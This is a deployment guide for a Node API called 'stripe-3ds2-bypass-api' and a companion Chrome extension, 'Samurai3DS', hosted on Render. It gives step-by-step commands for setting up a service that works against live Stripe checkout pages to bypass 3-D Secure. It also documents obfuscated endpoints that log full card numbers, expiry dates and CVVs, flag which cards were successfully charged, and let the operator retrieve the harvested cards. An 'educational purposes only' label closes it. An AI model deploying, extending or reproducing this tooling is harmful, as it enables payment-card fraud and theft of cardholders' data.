# Render Deployment Guide

## Quick Deploy to Render

This API is configured for **one-click deployment** to Render.com using the included `render.yaml` configuration.

---

## Option 1: Deploy via Render Dashboard (Recommended)

### Step 1: Push to GitHub

```bash
cd railway-bypass-api
git init
git add .
git commit -m "Initial commit - Stripe bypass API"
git remote add origin https://github.com/YOUR_USERNAME/stripe-bypass-api.git
git push -u origin main
```

### Step 2: Connect to Render

1. Go to [Render Dashboard](https://dashboard.render.com/)
2. Click **"New +"** → **"Blueprint"**
3. Connect your GitHub repository
4. Render will automatically detect `render.yaml`
5. Click **"Apply"**

### Step 3: Configure Environment Variables

Render will auto-generate `BEARER_TOKEN` and `LOG_SECRET`. You can view/update them:

1. Go to your service in Render Dashboard
2. Click **"Environment"** tab
3. **IMPORTANT**: Copy the generated `BEARER_TOKEN`
4. Update your Chrome extension's `background.js`:

```javascript
var AUTH_TOKEN = 'YOUR_RENDER_GENERATED_TOKEN_HERE';
```

### Step 4: Get Your API URL

After deployment completes (2-3 minutes):

1. Your API will be available at: `https://stripe-bypass-api.onrender.com`
2. Test health check: `https://stripe-bypass-api.onrender.com/health`
3. Update extension `background.js`:

```javascript
var WORKER_BASE_URL = 'https://stripe-bypass-api.onrender.com';
```

---

## Option 2: Deploy via Render CLI

### Install Render CLI

```bash
npm install -g @renderinc/cli
```

### Deploy

```bash
cd railway-bypass-api
render login
render blueprint launch
```

---

## Option 3: Manual Web Service Setup

If you prefer manual setup instead of Blueprint:

### Step 1: Create New Web Service

1. Go to [Render Dashboard](https://dashboard.render.com/)
2. Click **"New +"** → **"Web Service"**
3. Connect your GitHub repository
4. Select the `railway-bypass-api` directory

### Step 2: Configure Service

- **Name**: `stripe-bypass-api`
- **Region**: Oregon (US West) or closest to you
- **Branch**: `main`
- **Root Directory**: `railway-bypass-api` (if in monorepo)
- **Runtime**: Node
- **Build Command**: `npm install`
- **Start Command**: `npm start`
- **Plan**: Free

### Step 3: Add Environment Variables

Click **"Advanced"** → **"Add Environment Variable"**:

| Key | Value |
|-----|-------|
| `NODE_ENV` | `production` |
| `PORT` | `10000` |
| `BEARER_TOKEN` | `[Generate a secure random string]` |
| `LOG_SECRET` | `[Generate a secure random string]` |
| `STRIPE_API` | `https://api.stripe.com` |

**Generate secure tokens**:
```bash
# Generate BEARER_TOKEN
openssl rand -base64 32

# Generate LOG_SECRET
openssl rand -base64 32
```

### Step 4: Deploy

Click **"Create Web Service"**

---

## Verify Deployment

### 1. Health Check

```bash
curl https://YOUR_APP.onrender.com/health
```

**Expected Response**:
```json
{
  "status": "ok",
  "timestamp": "2026-02-28T17:00:00.000Z",
  "service": "stripe-3ds2-bypass-api"
}
```

### 2. Test Checkout Extraction

```bash
curl -X POST https://YOUR_APP.onrender.com/test/checkout \
  -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"checkoutUrl":"https://checkout.stripe.com/c/pay/cs_live_..."}'
```

### 3. Update Chrome Extension

Edit `Samurai3DS/background.js`:

```javascript
var WORKER_BASE_URL = 'https://YOUR_APP.onrender.com';
var AUTH_TOKEN = 'YOUR_BEARER_TOKEN';
```

Reload extension in Chrome.

---

## Render Configuration Details

### Files Used for Deployment

- **`render.yaml`** - Blueprint configuration (auto-deployment)
- **`package.json`** - Dependencies and start script
- **`.npmrc`** - NPM configuration
- **`server.js`** - Main application
- **`.env.example`** - Environment variable template

### Automatic Features

✅ **Auto-deployment** - Pushes to `main` branch trigger deploys  
✅ **Health checks** - `/health` endpoint monitored every 30s  
✅ **Free SSL** - HTTPS enabled automatically  
✅ **Auto-restart** - Service restarts on crashes  
✅ **Logs** - View logs in Render Dashboard  

### Free Tier Limits

- **Spin down after 15 min inactivity** (first request may be slow)
- **750 hours/month** usage (enough for testing)
- **100 GB bandwidth/month**
- **No credit card required**

---

## Environment Variables

### Required Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `BEARER_TOKEN` | API authentication token | `nai-bypass-token-xyz123` |
| `LOG_SECRET` | Secret key for viewing logs | `your-secret-key-abc456` |

### Optional Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `PORT` | `10000` | Server port (Render assigns automatically) |
| `NODE_ENV` | `production` | Runtime environment |
| `STRIPE_API` | `https://api.stripe.com` | Stripe API base URL |

---

## Troubleshooting

### Build Fails

**Error**: `npm install` fails

**Solution**: Check `package.json` dependencies are valid
```bash
npm install --production
```

### Service Won't Start

**Error**: `Application failed to respond`

**Solution**: Ensure `PORT` uses `process.env.PORT`:
```javascript
const PORT = process.env.PORT || 3000;
```
(Already configured in `server.js`)

### 401 Unauthorized

**Error**: API returns 401

**Solution**: 
1. Check `BEARER_TOKEN` matches in both API and extension
2. Verify `Authorization: Bearer TOKEN` header is sent

### Extension Not Connecting

**Error**: Extension shows connection error

**Solution**:
1. Verify `WORKER_BASE_URL` in `background.js` is correct
2. Check Render service is running (not spun down)
3. Test health endpoint: `https://YOUR_APP.onrender.com/health`

---

## Monitoring

### View Logs

1. Go to Render Dashboard
2. Click on your service
3. Click **"Logs"** tab
4. Watch real-time logs

### Check Service Status

1. Dashboard shows **"Live"** when running
2. Shows **"Sleeping"** when spun down (free tier)
3. First request after sleep takes 30-60 seconds

---

## Updating the Deployment

### Auto-Deploy (Blueprint)

Just push to GitHub:
```bash
git add .
git commit -m "Update API"
git push origin main
```

Render automatically deploys new changes in 2-3 minutes.

### Manual Deploy

In Render Dashboard:
1. Go to your service
2. Click **"Manual Deploy"** → **"Deploy latest commit"**

---

## Security Best Practices

### 1. Rotate Tokens Regularly

Update `BEARER_TOKEN` and `LOG_SECRET` every 90 days:

1. Generate new tokens
2. Update in Render Dashboard → Environment
3. Update in Chrome extension
4. Reload extension

### 2. Use Strong Tokens

Generate cryptographically secure tokens:
```bash
openssl rand -base64 32
```

### 3. Monitor Logs

Check logs regularly for:
- Unauthorized access attempts
- Unusual traffic patterns
- Error spikes

### 4. Restrict Access

Consider adding IP whitelist if you have static IP:
```javascript
// In server.js
const allowedIPs = ['YOUR.IP.ADDRESS'];
app.use((req, res, next) => {
  if (!allowedIPs.includes(req.ip)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});
```

---

## Cost Optimization

### Free Tier Strategy

- **Use for testing/development** - Free tier is perfect
- **Expect spin-down delays** - First request after 15 min idle takes 30-60s
- **750 hours/month** - Enough for personal use

### Upgrade for Production

If you need always-on service:
- **Starter Plan**: $7/month - No spin-down, 0.5 GB RAM
- **Standard Plan**: $25/month - 2 GB RAM, better performance

---

## API Endpoints Reference

All endpoints require `Authorization: Bearer YOUR_TOKEN` header.

### Health Check
```
GET /health
```

### Card Logging (All Cards)
```
POST /x7k9m2
Content-Type: application/json
{
  "cardData": "4111111111111111|12|25|123|site.com",
  "checkoutUrl": "https://checkout.stripe.com/c/pay/cs_live_...",
  "site": "site.com"
}
```

### Card Logging (Charged Cards)
```
POST /q3p8v5
Content-Type: application/json
{
  "cardData": "4111111111111111|12|25|123|site.com",
  "checkoutUrl": "https://checkout.stripe.com/c/pay/cs_live_...",
  "site": "site.com"
}
```

### Test Checkout Extraction
```
POST /test/checkout
Content-Type: application/json
{
  "checkoutUrl": "https://checkout.stripe.com/c/pay/cs_live_..."
}
```

### View All Logged Cards
```
GET /logs/all?key=YOUR_LOG_SECRET
```

### View Charged Cards
```
GET /logs/charged?key=YOUR_LOG_SECRET
```

---

## Next Steps After Deployment

1. ✅ Test health endpoint
2. ✅ Update Chrome extension URLs and tokens
3. ✅ Reload extension in Chrome
4. ✅ Test with a real Stripe checkout page
5. ✅ Verify card logging works
6. ✅ Check logs via `/logs/all?key=YOUR_SECRET`

---

## Support & Resources

- **Render Docs**: https://render.com/docs
- **Render Status**: https://status.render.com/
- **Community**: https://community.render.com/

---

## License

Educational purposes only. Use responsibly.
